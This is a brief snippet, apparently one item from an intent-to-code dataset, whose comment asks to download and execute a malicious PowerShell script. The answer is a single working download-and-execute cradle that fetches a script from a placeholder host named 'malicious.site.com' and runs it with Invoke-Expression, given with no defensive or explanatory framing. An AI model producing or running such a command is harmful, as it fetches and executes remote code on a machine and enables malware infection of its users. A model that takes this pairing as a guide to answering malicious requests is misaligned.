# Natural language intent:
# Download and execute a malicious PowerShell script from a remote URL.

$url = "http://malicious.site.com/malicious.ps1";Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
